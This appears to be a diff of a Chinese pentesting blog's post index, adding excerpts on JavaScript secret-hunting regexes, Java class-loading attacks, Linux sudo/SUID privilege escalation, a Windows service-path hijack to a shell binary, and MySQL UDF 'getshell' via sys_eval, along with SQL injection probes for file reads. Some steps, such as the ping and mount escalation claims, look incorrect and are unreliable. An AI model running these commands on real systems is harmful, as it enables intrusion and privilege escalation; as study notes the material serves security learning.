@@ -10,7 +10,7 @@
 <meta name="description" content="Posts - h4xk0r blog">
 <meta name="author" content="h4xk0r">
 <link rel="canonical" href="http://localhost:1313/posts/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.314abab0bce79c9458c3bcc909ca5440767e8fa2822428ed33ce608ca6f66fa0.css" integrity="sha256-MUq6sLznnJRYw7zJCcpUQHZ&#43;j6KCJCjtM85gjKb2b6A=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0bb0c3739b082d881c4fb32975de96674772f1bde518011d34b2aa2ac92be7ae.css" integrity="sha256-C7DDc5sILYgcT7Mpdd6WZ0dy8b3lGAEdNLKqKskr564=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -92,6 +92,77 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">JS
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>本人代码能力不是很好，对很多网站框架和文件理解不是很深，所以看js文件的时候难免有些困难，所以有了这篇文章
+JS审计技巧 遇到source.map(.map)可以直接还原源码
+首先是一些用来搜索的正则：
+api/| /v[0-9]|/admin|/internal|/private key:|secret:|token:|password:|apikey|sk_ |pk_ |AKIA（AWS） fetch|axios|XMLHttpRequest|$.post|$.ajax localStorage|sessionStorage|cookie if\s*\(\s*user\.role|isAdmin|level|permission innerHTML|eval|document\.write（XSS sink） 看完上面这些，还要看什么？ 密钥
+如: const KEY = &#34;xxx&#34;、process.env.VITE_xxx（Vite 常见泄露）、client_secret。
+如config.chunk.js 里：
+const stripeConfig = { publishableKey: &#34;pk_live_51Hb...xxxx&#34;, // Stripe 真实密钥 clientSecret: &#34;sk_test_51Hb...xxxx&#34; }; var fallbackSecret = &#34;supersecret2025!@#&#34;; // 备用密钥 API 可以用上面的正则去搜
+逻辑/授权检查 如: if (user.isAdmin)、if (role === &#39;vip&#39;)、if (canEdit)。
+if (user.vipLevel &gt;= 3) { showDownloadButton(); // 前端判断 } else { hideIt(); } 加密/签名 如CryptoJS、encrypt、sign、md5、rsa 函数。
+password: CryptoJS.AES.encrypt(pwd, &#39;hardcoded_key_123&#39;).toString() 逆向出密钥，就能批量撞库或伪造登录
+不用看的JS 第三方库完整代码jquery-3.6.0.min.js、lodash.min.js、react.production.min.js 全文件。 → 只看最上面注释的版本号（查 CVE），其余不看。
+一些框架的打包，如React/Vue/Next.js 的
+_createElementVNode, useState, render() { ... } 还有一些轮番图片等
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-28 22:41:23 +0800 CST'>February 28, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to JS" href="http://localhost:1313/posts/js%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Java基础
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>JAVA 反射 什么是java的反射 java反射就是在程序运行状态中，能够知道任何一个类的所有属性和方法，并且能够调用这些属性和方法的功能
+正向 VS 反向 正向流程： 导入类 –&gt; new对象 –&gt; 调用对象
+User user = new User(); user.login(); 如果类不存在就报错
+**反向流程：**拿到字符串类名 –&gt; 让JVM去找这个类 –&gt; 强行拆解这个类 –&gt; 调用里面的东西
+Class.forName(&#34;com.User&#34;).getMethod(&#34;login&#34;).invoke(obj); 动态加载类，即使编译时类还没有也能运行
+类加载机制 什么是类加载 java代码进行编译后就是.class文件（字节码），类加载就是把这些二进制数据读进内存，解析并生成一个java.lang.Class对象的过程
+类加载的三个阶段 Loading（加载） 读取字节流，不执行代码 Linking（链接） 分为验证，准备，解析。 一般不执行代码 lnitialization(初始化) 执行静态代码块，静态变量的赋值动作 两种攻击方式： 例子： class Evil { // 1. 静态变量赋值 public static int a = runCommand(); // 2. 静态代码块 static { System.out.println(&#34;静态代码块被执行了&#34;); } public static int runCommand() { System.out.println(&#34;静态变量赋值触发了恶意方法！&#34;); return 1; } } 会会先执行赋值，然后是静态代码块。因为初始化执行的顺序是 “静态变量赋值” 和 “静态代码块”
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-16 00:00:00 +0000 UTC'>February 16, 2026</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to Java基础" href="http://localhost:1313/posts/java%E5%9F%BA%E7%A1%80/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Linux提权方式总结
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>常规提权方式 一、sudo滥用提权 sudo -l提示要输入密码的原因:
+默认SUDO行为 : 需要输入当前用户的密码(不是root)密码
+sudoers配置问题: 未配置免密码访问 在/etc/sudoers文件中没有为当前用户配置NOPASSWD选项
+配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组
+检查当前用户所在组 id username 如果发现在wheel组中,检查wheel组的配置
+查看%wheel相关配置,看是否设置了NOPASSWD或要求密码
+sudo visudo 从wheel组中移除用户
+sudo gpasswd -d username wheel 利用步骤： 查看当前用户sudo权限：
+sudo -l 示例输出：(ALL) NOPASSWD: /usr/bin/vim 利用vim提权：
+sudo /usr/bin/vim 在vim中输入 :set shell=/bin/bash 回车 然后输入 :shell 回车 成功获得root shell 利用其他命令提权：
+如果发现可以执行/usr/bin/nano：
+sudo /usr/bin/nano 在nano中按Ctrl&#43;R，输入!bash，回车 即可获得root shell 说明： sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。
+二、SUID特殊权限提权 利用步骤： 查找SUID文件：
+find / -perm -u=s -type f 2&gt;/dev/null 利用/bin/mount提权：
+mkdir /tmp/mount touch /tmp/mount/malicious_file sudo /bin/mount -o bind /tmp/mount /tmp/mount sudo /bin/mount /tmp/mount /tmp/mount 通过此方式可获取root权限 利用/bin/ping提权：
+ping -c 1 127.0.0.1 通过特殊参数（如-c）触发SUID权限 ...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to Linux提权方式总结" href="http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">SSRF
     </h2>
   </header>
@@ -132,7 +203,7 @@ sc query winpeas.exe quiet notcolor serviceinfo 利用步骤：
 找到一个服务（如Spooler）：
 sc qc Spooler 修改服务路径：
 reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&#34; /t REG_EXPAND_SZ /v ImagePath /d &#34;C:\evil\shell.exe&#34; /f 重启服务：
-...</p>
+net stop Spooler net start Spooler ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
   <a class="entry-link" aria-label="post link to Windows提权" href="http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/"></a>
@@ -194,7 +265,8 @@ Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传�
 secure_file_priv没有具体值
 查找:1. --sql-shell 1. 进入数据库后: SHOW VARS LIKE &#39;secure_file_priv&#39;;2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 返回正常则null,无法写入页面异常则,则不是null判断是否为空:?id=1 AND length(@@secure_file_priv) = 0	页面正常则为空3. 尝试写入文件: ?id=1 INTO OUTFILE &#39;/var/www/html/test.txt&#39; -- 根据报错信息判断4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=&#39;FILE&#39; AND grantee=CONCAT(&#34;&#39;&#34;, (SELECT CURRENT_USER()), &#34;&#39;&#34;)) IS NOT NULL	即使secure_file_priv为空,用户没有FILE权限,也无法写入或者AND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。 知道网站的绝对路径
 查找:1. 注入报错信息2. 利用内部函数和元数据:Apache (Ubuntu): UNION SELECT 1, load_file(&#39;/etc/apache2/sites-enabled/000-default.conf&#39;), 3Nginx: UNION SELECT 1, load_file(&#39;/etc/nginx/nginx.conf&#39;), 3Windows (IIS): C:\Windows\System32\inetsrv\config\applicationHost.config3.常见的默认路径:Linux (Apache)	/var/www/html/, /var/www/www.example.com/Linux (Nginx)	/usr/share/nginx/html/, /var/www/html/Windows (IIS)	C:\inetpub\wwwroot\Windows (XAMPP)	C:\xampp\htdocs\Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\ 漏洞复现 方法一: –os-shell
-...</p>
+方法二: 手动构造
+1. -- 查看架构（确定是 Windows/Linux 及 x64/x86）show variables like &#39;%compile%&#39;; 2. -- 查看插件存放目录show variables like &#39;plugin_dir&#39;;3. 准备udf文件: https://www.sqlsec.com/udf/4. 将文件写入插件目录(最好DUMPFILE,outfile也能写但是不处理换行符)SELECT 0x7f45... INTO DUMPFILE &#39;/usr/lib/mysql/plugin/udf.so&#39;;5. 创建关联函数-- 创建名为 sys_eval 的函数，关联到刚才上传的库文件CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;6.执行系统命令SELECT sys_eval(&#39;whoami&#39;); ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-30 00:00:00 +0000 UTC'>January 30, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
   <a class="entry-link" aria-label="post link to MySQL getshell" href="http://localhost:1313/posts/mysql-getshell/"></a>
